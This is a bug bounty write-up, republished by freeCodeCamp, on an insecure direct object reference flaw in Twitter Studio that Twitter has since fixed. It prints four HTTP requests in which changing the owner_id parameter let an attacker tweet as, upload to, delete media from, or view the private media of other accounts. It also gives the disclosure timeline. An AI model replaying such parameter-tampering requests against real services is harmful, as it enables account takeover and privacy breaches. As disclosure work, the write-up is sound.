---
title: How I could have hacked all Twitter accounts (and how I earned $5,040 in bounties)
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2018-01-04T05:26:16.000Z'
originalURL: https://freecodecamp.org/news/how-i-hacked-your-twitter-account-tweeting-viewing-deleting-photos-and-other-media-bf2cb3a18818
coverImage: https://cdn-media-1.freecodecamp.org/images/1*LmBD9OaRAJPnBYBoZwyZMw.jpeg
tags:
- name: Application Security
  slug: application-security
- name: bug bounty
  slug: bug-bounty
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: Twitter
  slug: twitter
seo_title: null
seo_desc: 'By AppSecure

  Summary

  This blog post is about an Insecure direct object reference vulnerability on Twitter.
  This vulnerability could have been used by attackers to undertake various activities.
  For example, they could tweet from other accounts, upload...'
---

By AppSecure

### [Summary](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText)

[This blog post is about an](https://unsplash.com/search/photos/hacker?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText) [Insecure direct object reference](https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References) vulnerability on Twitter. This vulnerability could have been used by attackers to undertake various activities. For example, they could tweet from other accounts, upload videos on behalf of users, delete pics/videos from the victim’s account, or view private media uploaded by other twitter accounts. All endpoints on studio.twitter.com were vulnerable.

### **Description**

Twitter is an online news and social networking service where users post and interact with messages, called “tweets”, restricted to 140 characters. Registered users can post tweets, but those who are unregistered can only read them. Users access Twitter through its website interface, SMS, or a mobile device app.

Twitter launched a new product named Twitter Studio (studio.twitter.com) in September 2016. I started looking out for security loopholes after the launch.

All API requests on studio.twitter.com were sending a parameter named “owner_id” which was the publicly available twitter user ID of the logged in user. The `Owner_id` parameter was missing authorisation checks for changes, which allowed me to take actions on behalf of other Twitter users.

#### **Vulnerable request #1 (Tweeting from other Twitter accounts.)**

```
POST /1/tweet.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s account id”,”owner_id”:”victim’s user id”,”metadata”:{“monetize”:false,”embeddable_playback”:false,”title”:”Test tweet by attacker”,“description”:”attacker attacker”,”cta_type”:null,”cta_link”:null},”media_key”:””,“text”:”attacker attacker”}
```

Replaying the above request with the victim’s ID resulted in a tweet from the victim’s account.

#### **Vulnerable request #2 (Upload Media from another’s account)**

```
POST /1/library/add.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s accountid”,”owner_id”:”victim’s id”,”metadata”:{“monetize”:false,”name”:”abcd.png”,”embeddable_playback”:true,”title”:”Attacker”,”description”:””,”cta_type”:null,”cta_link”:null},”media_id”:””,”managed”:false,”media_type”:”TweetImage”}
```

Replaying above request with the victim’s `owner_id` uploaded media from other user accounts.

#### **Vulnerable request #3 (Delete videos of other accounts)**

```
POST /1/library/remove.json HTTP/1.1Host: studio.twitter.com
```

```
{“account_id”:”attacker’s account id”,”owner_id”:”victim’s id”,”media_key”:”victim’s video id”}
```

Replaying the above request with victim’s user id and victim’s `media_key` deleted media from the victim’s account.

#### **Vulnerable request #4 (Private media disclosure)**

`GET /1/library/list.json?account_id=attacker’s account id&owner_id=victim’s id&limit=20&offset=0 HTTP/1.1`  
`Host: studio.twitter.com`  
`User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:37.0) Gecko/20100101 Firefox/37.0`  
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`  
`Accept-Language: en-US,en;q=0.5`  
`Accept-Encoding: gzip, deflate`  
`Referer: [https://studio.twitter.com/library](https://studio.twitter.com/library)`  
`Cookie:`   
`Connection: keep-alive`

Replaying the above request with the victim’s user ID and my account ID leaked all private media of the victim’s Twitter account in response.

### **Video Proof of concept**

All tests were done on a friend’s account after getting his permission.

#### #1 Tweet from victim’s account, Private media leakage

#### #2 Delete media from victim’s tweets

### **Timeline**

#### 29th August 2016

Reported all findings to Twitter in 3 different reports, as the endpoints were different.

#### 2nd September 2016

Received response from Twitter team saying we are looking into the issue and would be closing out other reports as duplicate, as they shared the same root cause — i.e. missing `owner_id` check.

#### 3rd September 2016

Bounty of **$5,040** rewarded by Twitter

I’m the founder of [AppSecure](https://appsecure.in), a specialised cyber security company with years of skill acquired and meticulous expertise. We are here to safeguard your business and critical data from online and offline threats or vulnerabilities.

You can contact us at hello@appsecure.in

